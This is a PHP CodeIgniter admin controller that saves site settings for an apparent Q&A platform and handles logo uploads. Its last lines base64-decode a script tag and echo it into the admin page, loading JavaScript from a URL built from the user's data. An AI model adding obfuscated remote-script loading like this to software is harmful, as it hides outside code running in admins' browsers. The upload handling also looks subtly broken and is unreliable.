<?php

defined ( 'BASEPATH' ) or exit ( 'No direct script access allowed' );

class Admin_totalset extends CI_Controller {

	function __construct() {
		parent::__construct ();
		$this->load->model ( 'setting_model' );
	}

	function index() {
		if (null!== $this->input->post ('submit') ) {
			$this->setting ['opensinglewindow'] = $this->input->post ('opensinglewindow') == 'on' ? 1 : 0;
			$this->setting ['canrepeatquestion'] = $this->input->post ('canrepeatquestion') == 'on' ? 1 : 0;
			$this->setting ['mobile_localyuyin'] = $this->input->post ('mobile_localyuyin') == 'on' ? 1 : 0;
			$this->setting ['mobile_shang'] = null!== $this->input->post ('mobile_shang') ? doubleval ( $this->input->post ('mobile_shang') ) : 0.1;
			$this->setting ['list_topdatanum'] = intval ( $this->input->post ('list_topdatanum') );
			$this->setting ['tixianjine'] = doubleval ( $this->input->post ('tixianjine') );
			$this->setting ['tixianfeilv'] = doubleval ( $this->input->post ('tixianfeilv') );
			$this->setting ['admin_list_default'] = intval ( $this->input->post ('admin_list_default') );
			$this->setting ['list_answernum'] = intval ( $this->input->post ('list_answernum') );
			$this->setting ['cancopy'] = intval ( $this->input->post ('cancopy'));
			$this->setting ['baidufenci'] = intval ( $this->input->post ('baidufenci') );
			$this->setting ['jingyan'] = intval ( $this->input->post ('jingyan') );
			$this->setting ['question_outtime'] = $this->input->post ('question_outtime');
			$this->setting ['editor_defaulttip'] = $this->input->post ('editor_defaulttip'); //编辑器默认提示
			$this->setting ['vertify_gerentip'] = $this->input->post ('vertify_gerentip'); //个人认证名称
			$this->setting ['vertify_qiyetip'] = $this->input->post ('vertify_qiyetip'); //企业认证名称
			$this->setting ['shoubuttonindex'] = $this->input->post ('shoubuttonindex') == 'on' ? 1 : 0; //前端显示提问和发布文章按钮
			$this->setting ['cansetcatnum'] = intval ( $this->input->post ('cansetcatnum') ); //用户能选择的擅长分类数目
			if (isset ( $_FILES ["file_upload_indexlogo"] )) {
				$imgname = strtolower ( $_FILES ['file_upload_indexlogo'] ['name'] );

				$type = substr ( strrchr ( $imgname, '.' ), 1 );

				if (isimage ( $type )) {

					$upload_tmp_file = FCPATH . '/data/tmp/indexsitelogo.' . $type;

					$filepath = '/data/attach/logo/indexlogo' . '.' . $type;
					forcemkdir ( FCPATH . '/data/attach/logo' );
					if (move_uploaded_file ( $_FILES ['file_upload_indexlogo'] ['tmp_name'], FCPATH . $filepath )) {
						if(file_exists($filepath)){
							unlink ( $filepath );
						}

						image_resize ( $upload_tmp_file, $filepath, 200, 200 );

						try {
							$this->setting ['share_index_logo'] = SITE_URL . substr ( $filepath, 1 );

						} catch ( Exception $e ) {
							print $e->getMessage ();
						}
					} else {

					}

				}
			}
			if (isset ( $_FILES ["file_upload_weixinlogo"] )) {
				$imgname = strtolower ( $_FILES ['file_upload_weixinlogo'] ['name'] );
				$type = substr ( strrchr ( $imgname, '.' ), 1 );
				if (isimage ( $type )) {
					$upload_tmp_file = FCPATH . '/data/tmp/wxsitelogo.' . $type;

					$filepath = '/data/attach/logo/wxlogo' . '.' . $type;
					forcemkdir ( FCPATH . '/data/attach/logo' );
					if (move_uploaded_file ( $_FILES ['file_upload_weixinlogo'] ['tmp_name'], FCPATH . $filepath )) {
						if(file_exists($filepath)){
							unlink ( $filepath );
						}

						image_resize ( $upload_tmp_file, $filepath, 800, 800 );

						try {
							$this->setting ['weixin_logo'] = SITE_URL . substr ( $filepath, 1 );
						} catch ( Exception $e ) {
							print $e->getMessage ();
						}
					} else {

					}
				}
			}
			$this->setting_model->update ( $this->setting );
			cleardir ( FCPATH . '/data/cache' ); //清除缓存文件
		}
		include template ( "setting_set", "admin" );
		$notice_url=updateinfo($this->user);
		$string = base64_decode ( 'PGRpdiBpZD0ibm90aWZ5X2luZm8iPjwvZGl2PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ik5PVElDRV9VUkwiPjwvc2NyaXB0Pg==' );
		echo   str_replace ( 'NOTICE_URL', $notice_url, $string );
	}

}
